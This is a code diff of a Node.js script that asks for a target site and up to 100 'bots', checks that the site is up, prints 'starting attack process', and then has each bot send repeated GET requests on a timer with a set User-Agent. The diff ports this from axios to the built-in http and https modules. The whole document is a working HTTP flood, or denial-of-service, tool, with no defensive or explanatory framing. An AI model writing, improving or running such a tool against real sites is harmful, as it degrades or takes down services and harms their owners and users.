@@ -1,5 +1,6 @@
 import fs from 'fs-extra';
-import axios from 'axios';
+import http from 'http';
+import https from 'https';
 import utils from './src/utils.js';
 import rl from 'readline-sync';
 const cwd = process.cwd();
@@ -20,34 +21,36 @@ const cwd = process.cwd();
   let numBots = rl.questionInt('Enter the number of bots (1-100): ');
   numBots = Math.min(numBots, 100);
 
-  try {
-    const response = await axios.get(site);
-    if (!response) {
-      utils.sleep(200);
-      console.log('[-]: Site is down.');
-    } else {
-      utils.sleep(200);
-      console.log('[+]: Site up!, starting attack process.');
+  const protocol = site.startsWith('https') ? https : http;
 
-      const ping = async () => {
-        try {
-          await axios.get(site, {
+  try {
+    protocol.get(site, (response) => {
+      if (response.statusCode !== 200) {
+        utils.sleep(200);
+        console.log('[-]: Site is down.');
+      } else {
+        utils.sleep(200);
+        console.log('[+]: Site up!, starting attack process.');
+
+        const ping = () => {
+          protocol.get(site, {
             headers: {
               'User-Agent': userAgent,
             },
+          }, (res) => {
+            console.log('[+]: Ping successful');
+          }).on('error', (error) => {
+            console.error('[-]: Error in ping:', error);
           });
-          console.log('[+]: Ping successful');
-        } catch (error) {
-          console.error('[-]: Error in ping:', error);
-        }
-      };
+        };
 
-      for (let i = 0; i < numBots; i++) {
-        setInterval(ping, pingInterval);
+        for (let i = 0; i < numBots; i++) {
+          setInterval(ping, pingInterval);
+        }
+        
+        setInterval(utils.checkSite, checkInterval);
       }
-      
-      setInterval(utils.checkSite, checkInterval);
-    }
+    });
   } catch (error) {
     utils.sleep(1500);
     console.log(`[-]: An error occurred: ${error}`);
